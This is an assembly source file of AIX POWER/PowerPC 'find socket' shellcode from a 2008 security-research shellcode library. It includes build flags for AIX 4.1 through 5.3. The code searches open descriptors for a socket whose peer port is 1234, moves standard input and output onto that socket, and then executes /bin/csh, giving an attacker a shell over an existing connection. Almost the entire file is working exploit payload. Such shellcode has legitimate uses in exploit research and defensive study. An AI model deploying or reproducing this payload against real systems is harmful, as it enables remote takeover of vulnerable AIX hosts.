/*
 *  $Id: aix-power-fndsockcode.S 6 2008-09-10 17:27:50Z ramon $
 *
 *  aix-power-fndsockcode.S - AIX POWER/PowerPC Find socket code
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -DVERSION -o aix-power-fndsockcode aix-power-fndsockcode.S
 *
 * Where VERSION is one of the currently supported AIX versions.
 * -DV41    AIX 4.1
 * -DV42    AIX 4.2
 * -DV43    AIX 4.3
 * -DV4330  AIX 4.3.3.0
 * -DV53    AIX 5.3
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

syscallcode:
    xor.    %r31,%r31,%r31
    # xor.    %r5,%r5,%r5
    bnel    syscallcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r30,-483(%r30)
    # cal     %r30,-475(%r30)
    mtctr   %r30
    bctr
    # .long   0xff0204d2
    # .long   0x7f000001
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    cal     %r30,-8(%r30)

fndsockcode:

    # getpeername

    lil     %r29,__CAL

    stu     %r31,-4(%r1)
    mr      %r28,%r1
    cal     %r27,-467(%r29)
    stu     %r27,-4(%r1)
    mr      %r27,%r1

    # lil     %r31,32767

0:
    cal     %r31,511(%r31)
    cal     %r31,-511+1(%r31)
    # cal     %r31,-1(%r31)

    mr      %r5,%r27
    mr      %r4,%r28
    mr      %r3,%r31
    cal     %r2,__NC_getpeername(%r29)
    mtctr   %r30
    bctrl

    cal     %r26,511(%r28)
    lhz     %r26,-511+2(%r26)

    cmpli   0,%r26,1234
    bne     0b

    # close

    cal     %r25,-509(%r29)

1:
    mr      %r3,%r25
    cal     %r2,__NC_close(%r29)
    mtctr   %r30
    bctrl

    # kfcntl

    mr      %r5,%r25
    xor     %r4,%r4,%r4
    mr      %r3,%r31
    cal     %r2,__NC_kfcntl(%r29)
    mtctr   %r30
    bctrl

    ai.     %r25,%r25,-1
    bge     1b

shellcode:
    # lil     %r31,__CAL

    xor.    %r5,%r5,%r5
    bnel    shellcode

    # mflr    %r30
    # cal     %r30,511(%r30)
    # cal     %r3,-475(%r30)
    mflr    %r24
    cal     %r24,511(%r24)
    cal     %r3,-475(%r24)

    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1

    # cal     %r2,__NC_execve(%r31)
    cal     %r2,__NC_execve(%r29)

    mtctr   %r30
    bctr
    .asciz  "/bin/csh"
